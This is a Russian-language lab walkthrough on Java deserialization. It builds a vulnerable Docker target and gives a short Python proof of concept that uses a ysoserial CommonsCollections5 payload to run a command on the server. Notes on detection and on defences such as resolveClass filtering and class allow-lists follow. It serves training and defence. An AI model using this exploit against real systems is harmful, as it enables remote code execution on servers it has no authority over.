
# Ссылки

- https://github.com/frohoff/ysoserial
- https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/
- http://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html

## Развертывание

Запускаем [докер контейнер](https://github.com/GrrrDog/ZeroNights-WebVillage-2017/) для java. 
В данном примере уязвимый сервис будет находиться на http://java.lab


# Эксплуатация

## Шаг 1

Скачиваем [ysoserial](https://github.com/frohoff/ysoserial).

## Шаг 2

Используем следующий POC

```python
import requests
import urllib
import subprocess
import base64

# генерируем payload
payload = subprocess.check_output("java -jar ysoserial.jar CommonsCollections5 'touch /tmp/huck-you.txt'", shell=True)
# отправляем
result = requests.get('http://java.lab/ois?sess=%s' % (urllib.parse.quote(base64.b64encode(payload)),))
print(result.text)
```

Сгенерированный payload с помощью ysoserial запустит произвольный код на атакуемом сервере. При этом вылетит ошибка согласования типов, однако код всё равно запустится. 

# Детектирование

- Класс вредоносного объекта присутствует в classpath сервера. 
- Класс вредоносного объекта ― сериализуемый или экстернализуемый.

# Защита

- переопределение  метода resolveClass().

При чтении потока сериализованному объекту предшествует описание класса. Эта структура позволяет  реализовать свой собственный алгоритм чтения описания класса и в зависимости от имени класса решать, следует ли продолжить чтение потока. Для этого можно использовать переопределение  метода resolveClass(). Его можно использовать для выдачи исключения всякий раз, когда поток содержит неожидаемый класс. Таким образом exception выдаётся до того, как объект начинает десериализовываться. 


- Своевременное обновление библиотек.
- Использование белого листа для десериализуемых объектов. 

